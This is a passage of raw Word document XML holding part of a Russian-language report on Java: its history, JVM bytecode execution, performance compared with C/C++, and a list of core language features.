          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Гослингом</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> для программирования бытовых электронных устройств. Из-за того, что язык с таким названием уже существовал, вскоре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был переименован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Назван в честь марки кофе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w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>как</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">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двадцать первого века название языка нередко переводилось как Ява, а не транскрибировалось, как это стало общепринятым позднее.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DD2596" w:rsidRDefault="005E2C4B"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Впоследствии язык стал использоваться для написания клиентских приложений и серверного программного обеспечения.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DD2596" w:rsidRPr="00073DDF" w:rsidRDefault="00DD2596" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00853AAF" w:rsidRPr="00853AAF" w:rsidRDefault="00853AAF" w:rsidP="00B420AE">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="709"/>
        <w:jc w:val="both"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="4" w:name="_Toc10727425"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">1.2Основние </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>знання</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> про </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>мови</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>програмування</w:t>
      </w:r>
      <w:bookmarkEnd w:id="4"/>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </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транслируются в байт-код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выполняемый виртуальной машиной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(JVM) — программой, обрабатывающей байтовый код и передающей инструкции оборудованию как интерпретатор.</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r w:rsidR="00DD2596">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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>коде,широкое</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> использование платформенно-ориентированного кода (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>native</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00DD2596">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">-код) в стандартных библиотеках, </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">аппаратные средства, обеспечивающие ускоренную обработку байт-кода (например, технология </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Jazelle</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>, поддерживаемая некоторыми процессорами архитектуры ARM).</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По данным сайта shootout.alioth.debian.org, для семи разных задач время выполнения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составляет в среднем в полтора-два раза больше, чем для C/C++, в некоторых случаях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быстрее, а в отдельных случаях в 7 раз медленнее. С другой стороны, для большинства из них потребление памяти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-машиной было в 10—30 раз больше, чем программой на C/C++. Также примечательно исследование, проведённое компанией </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Google</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, согласно которому отмечается существенно более низкая производительность и </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00DD2596">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>боо</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>льшее</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> потребление памяти в тестовых примерах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 сравнении с аналогичными программами на C++.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsid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Идеи, заложенные в концепцию и различные реализации среды виртуальной машины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вдохновили множество энтузиастов на расширение перечня языков, которые могли бы быть использованы для создания программ, </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">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w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Microsoft</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00853AAF" w:rsidRPr="00073DDF" w:rsidRDefault="00853AAF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="708"/>
        <w:jc w:val="both"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005E2C4B" w:rsidRPr="00073DDF" w:rsidRDefault="00853AAF" w:rsidP="00B420AE">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="709"/>
        <w:jc w:val="both"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="5" w:name="_Toc10727426"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>1.3</w:t>
      </w:r>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Основные возможности </w:t>
      </w:r>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
      <w:bookmarkEnd w:id="5"/>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="0060216E"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hyperlink r:id="rId10" w:tooltip="Сборка мусора (программирование)" w:history="1">
        <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>Автоматическое управление памятью</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>.</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Расширенные возможности обработки исключительных ситуаций.</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Богатый набор средств фильтрации ввода-вывода.</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Набор стандартных коллекций: </w:t>
      </w:r>
      <w:hyperlink r:id="rId11" w:tooltip="Индексный массив" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>массив</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>, </w:t>
      </w:r>
      <w:hyperlink r:id="rId12" w:tooltip="Список (информатика)" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>список</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>, </w:t>
      </w:r>
      <w:hyperlink r:id="rId13" w:tooltip="Стек" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>стек</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t> и т. п.</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простых средств создания сетевых приложений (в том числе с использованием </w:t>
      </w:r>
      <w:hyperlink r:id="rId14" w:tooltip="Сетевой протокол" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>протокола</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:hyperlink r:id="rId15" w:tooltip="RMI" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>RMI</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>).</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классов, позволяющих выполнять </w:t>
      </w:r>
      <w:hyperlink r:id="rId16" w:tooltip="HTTP" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>HTTP</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-запросы и обрабатывать ответы.</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Встроенные в язык средства создания многопоточных приложений, которые потом были </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>портированы</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> на многие языки (например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"https://ru.wikipedia.org/wiki/Python" \o "Python"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Унифицированный доступ к </w:t>
      </w:r>
      <w:hyperlink r:id="rId17" w:tooltip="База данных" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>базам данных</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>:</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отдельных </w:t>
      </w:r>
      <w:hyperlink r:id="rId18" w:tooltip="SQL" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>SQL</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-запросов — на основе </w:t>
      </w:r>
      <w:hyperlink r:id="rId19" w:tooltip="JDBC" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>JDBC</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>, </w:t>
      </w:r>
      <w:hyperlink r:id="rId20" w:tooltip="SQLJ" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>SQLJ</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>;</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концепции объектов, обладающих способностью к хранению в базе данных — на основе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"https://ru.wikipedia.org/w/index.php?title=Java_Data_Objects&amp;action=edit&amp;redlink=1" \o "Java Data Objects (страница отсутствует)"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Data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Objects</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 (</w:t>
      </w:r>
      <w:hyperlink r:id="rId21" w:tooltip="en:Java Data Objects" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
          </w:rPr>
          <w:t>англ.</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>) и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"https://ru.wikipedia.org/wiki/Java_Persistence_API" \o "Java Persistence API"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Persistence</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> API</w:t>
      </w:r>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обобщений (начиная с версии 1.5).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00DD2596" w:rsidRPr="00853AAF" w:rsidRDefault="00073DDF" w:rsidP="0060216E">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лямбд, замыканий, встроенные возможности функционального программирования (с 1.8).</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Примеры программ</w:t>
      </w:r>
      <w:r w:rsidR="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> на рисунке 1.1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00B420AE">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:noProof/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="7DC3E8F8" wp14:editId="5FCD779D">
            <wp:extent cx="3629025" cy="103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1035050"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00B420AE" w:rsidRDefault="00B420AE" w:rsidP="00B420AE">
      <w:pPr>
        <w:spacing w:line="360" w:lineRule="auto"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Малюнок</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1.1 - Приклад </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>програми</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="005E2C4B" w:rsidRPr="00B420AE" w:rsidRDefault="00B420AE" w:rsidP="00B420AE">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="709"/>
        <w:jc w:val="both"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="6" w:name="_Toc10727427"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>1.4</w:t>
      </w:r>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
